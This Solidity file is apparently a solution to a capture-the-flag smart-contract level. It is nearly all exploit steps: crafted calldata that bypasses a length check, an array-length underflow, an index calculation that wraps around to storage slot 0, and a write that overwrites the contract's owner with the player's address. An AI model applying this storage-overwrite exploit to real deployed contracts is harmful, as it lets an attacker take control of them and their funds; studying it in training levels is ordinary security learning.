pragma solidity ^0.4.24;

// in console
// sig = web3.sha3("make_contact(bytes32[])").slice(0,10)
// data1 = "0000000000000000000000000000000000000000000000000000000000000020"
// data2 = "1000000000000000000000000000000000000000000000000000000000000001"
// await contract.contact()
// contract.sendTransaction({data: sig + data1 + data2});
// await contract.contact()

contract Calc {
    
    bytes32 public one;
    uint public index;
    uint public length;
    bytes32 public lengthBytes;
    
    function getIndex() public {
        one = keccak256(bytes32(1));
        index = 2 ** 256 - 1 - uint(one) + 1;
    }
}

// in console
// contract.retract() // 先让数组长度溢出
// contract.revise(
//     '35707666377435648211887908874984608119992236509074197713628505308453184860938', 
//     '0x000000000000000000000000899f879df02dc33893c54d6D02A3b2D6bBE144Df', 
//     {from:player, gas: 900000}
//     );
